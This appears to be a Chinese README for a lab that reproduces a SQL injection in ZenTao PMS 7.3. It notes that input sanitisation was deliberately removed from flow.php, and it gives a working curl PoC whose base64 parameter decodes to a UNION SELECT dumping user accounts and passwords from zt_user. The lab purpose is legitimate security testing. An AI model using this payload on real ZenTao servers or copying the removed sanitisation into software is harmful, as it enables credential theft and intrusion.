## 环境说明

* src/zentaopms/7.3

  * 后台地址

    http://172.17.0.2/admin/privilege.php?act=login

  * 管理员账号

    admin/admin123

  * 去除补丁

    删除了./flow.php line 2137的intval函数，用于复现前一版本的SQL注入漏洞



## zentaoPMS SQL注入漏洞

测试镜像

* src/zentaopms/7.3

影响版本

* zentaopms <=  7.3

参考链接

* [禅道项目管理软件 SQL注入漏洞（无需登录）](https://www.wooyun.pro/bugs/wooyun-2015-0151486)

Poc

```shell
curl "http://172.17.0.2/www/block-main.html?mode=getblockdata&blockid=task&param=eyJhY2NvdW50IjoiYWRtaW4iLCJ0eXBlIjoiaWQ9LTEgVU5JT04gU0VMRUNUIDEsMiwzLDQsNSw2LGFjY291bnQsOCw5LHBhc3N3b3JkLDEsMiwzLDQsNSw2LDcsOCw5LDAsMSwyLDMsNCw1LDYsNyw4LDksMCwxLDIsMyw0LDUsNiw3LDggRlJPTSB6dF91c2VyIyJ9"
```

成功会返回系统user的账号密码，param参数为注入点，可用sqli-exp-gen.php来生成
